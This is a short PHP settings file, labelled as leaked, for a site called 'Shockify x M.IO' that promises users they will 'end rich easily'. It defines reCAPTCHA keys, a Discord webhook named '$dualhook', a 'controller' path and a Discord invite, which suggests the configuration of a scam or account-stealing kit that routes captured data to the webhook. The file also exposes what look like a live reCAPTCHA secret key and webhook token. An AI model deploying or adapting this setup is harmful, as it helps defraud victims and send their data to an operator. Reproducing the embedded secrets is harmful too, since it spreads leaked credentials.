<?php
// leaked by vkevin 
$siteName = "Shockify x M.IO";
$webText = htmlspecialchars("Start from nothing & end rich easily.");
$recaptcha_sitekey = "6Le3r6YhAAAAAOZMXlzs-cg-bIoyzTbVTtMQwcOS";
$recaptcha_secretkey = "6Le3r6YhAAAAAC3nYqVxLBYNul_7e6cGGJFaxGE-";
$dualhook = "https://discord.com/api/webhooks/1012154236986990644/AAKWQ0ZvSct9VCIj8IlX6Ys8MMiVho3-ubd1d6ogwxx49qBp-xz4zJKO86u3qHkA82-Q";
$mainpfp = "https://cdn.discordapp.com/attachments/974336980907356170/974337590863986738/Project_5-1.jpg";
$embedColor = "000"; #WITHOUT HASHTAG
/* controller info*/
//Example: TEST-A1B2C3D4E5
$controllerpath = "SHOCK";
//MAKE SURE DISCORD IS LIKE https://discord.com/invite/vkevin
$discord = "https://discord.com/invite/6k3yCsMTG8";
?>